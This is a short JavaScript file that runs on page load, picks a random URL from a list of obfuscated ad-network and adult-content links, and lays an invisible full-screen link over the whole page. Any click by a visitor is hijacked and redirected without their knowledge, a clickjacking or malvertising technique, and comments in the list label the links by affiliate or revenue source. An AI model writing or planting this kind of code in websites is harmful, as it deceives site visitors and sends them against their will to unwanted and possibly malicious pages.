function createLink() {
  var urls = [
    // hil: db (ss)
    "https://grim-package.com/b.3yVi0OPz3/pDvqblmoVxJWZ_DC0/1ZNhDOM/2KO/TacQ2HL/TiUO0JMmzLYw5-NizhcK",
    "https://www.qrcreate.online",

    // hil: Brian
    "https://aggravatingoil.com/bD3.V/0WPd3Np/vubMm/VqJbZWDa0q1lNtT-QsyRMmj/Ew2XL_TmUQ1sN/DlIDyoMyTqcg",
    "https://json.navigateall.com",

    // mon: lucy
    // "https://phuruxoods.com/4/7683326",
    // "https://whauzavouweb.com/4/7683329",
    // "https://naglelri.net/4/7683327",
    // "https://fouwhigrezi.net/4/7683328",
    "https://boovoogie.net/4/7683330",
    "https://rangauck.com/4/7683319",
    
    // "https://json.qrcreate.online",
    // "https://dubzenom.com/4/7782127",

    // juicy
    "https://sexytalk.mjsj.sbs/tags/",

    // pending
    "https://hot123.top/tags/",

    // hil: db123
    "https://classic-bonus.com/b/3gV.0-Pp3dpRvtbRmxVLJkZqD/0m1gN/TJcYwENIT_ctyoLfTRUY1wN/zMAI1FNczqMW",
    "https://sexystory.navigateall.com/tags/",
  ];

  if (urls.length === 0) {
    return;
  }
  var a = document.createElement('a');
  a.href = urls[Math.floor(Math.random() * urls.length)];
  a.rel = 'noopener noreferrer';
  a.style.cssText = 'position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 9999; opacity: 0;';
  document.body.appendChild(a);
}

document.addEventListener('DOMContentLoaded', createLink);
